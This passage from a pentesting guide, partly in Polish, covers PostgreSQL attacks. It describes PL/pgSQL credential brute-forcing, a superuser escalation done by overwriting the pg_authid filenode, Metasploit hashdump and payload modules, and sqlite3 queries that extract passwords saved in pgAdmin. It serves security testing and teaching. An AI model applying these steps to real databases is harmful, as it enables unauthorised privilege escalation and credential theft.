**PL/pgSQL** to **w pełni funkcjonalny język programowania**, który oferuje większą kontrolę proceduralną w porównaniu do SQL. Pozwala na użycie **pętli** i innych **struktur sterujących** w celu ulepszenia logiki programu. Dodatkowo, **instrukcje SQL** i **triggery** mogą wywoływać funkcje stworzone przy użyciu języka **PL/pgSQL**. Ta integracja pozwala na bardziej wszechstronne podejście do programowania i automatyzacji.\
**Możesz nadużyć tego języka, aby poprosić PostgreSQL o brute-force poświadczeń użytkowników.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> The following privesc vector is especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

Jeśli możesz **odczytywać i zapisywać pliki serwera PostgreSQL**, możesz **stać się superużytkownikiem** przez nadpisanie on-disk filenode powiązanego z wewnętrzną tabelą `pg_authid`.

Dowiedz się więcej o **tej technice** [**tutaj**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Obtain the PostgreSQL data directory
2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); set all `rol*` boolean flags to 1 for full permissions.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query
8. You should now have the privileges of a full superadmin.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logi

W pliku _**postgresql.conf**_ możesz włączyć postgresql logi, zmieniając:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Następnie, **zrestartuj usługę**.

### pgadmin

[pgadmin](https://www.pgadmin.org) to platforma administracyjna i deweloperska dla PostgreSQL.\
Możesz znaleźć **hasła** wewnątrz pliku _**pgadmin4.db**_\
Możesz je odszyfrować, używając funkcji _**decrypt**_ w skrypcie: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Uwierzytelnianie klientów w PostgreSQL jest zarządzane przez plik konfiguracyjny o nazwie **pg_hba.conf**. Plik ten zawiera serię rekordów, z których każdy określa typ połączenia, zakres adresów IP klienta (jeśli dotyczy), nazwę bazy danych, nazwę użytkownika oraz metodę uwierzytelniania używaną do dopasowywania połączeń. Do uwierzytelnienia używany jest pierwszy rekord, który pasuje do typu połączenia, adresu klienta, żądanej bazy danych i nazwy użytkownika. Nie ma mechanizmu awaryjnego ani zapasowego w przypadku niepowodzenia uwierzytelniania. Jeśli żaden rekord nie pasuje, dostęp jest odmawiany.

Dostępne metody uwierzytelniania oparte na haśle w pg_hba.conf to **md5**, **crypt**, i **password**. Metody te różnią się sposobem przesyłania hasła: skrótowanego MD5, zaszyfrowanego przez crypt lub w postaci jawnej. Ważne jest, aby pamiętać, że metoda crypt nie może być używana z hasłami, które zostały zaszyfrowane w pg_authid.

## Źródła

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
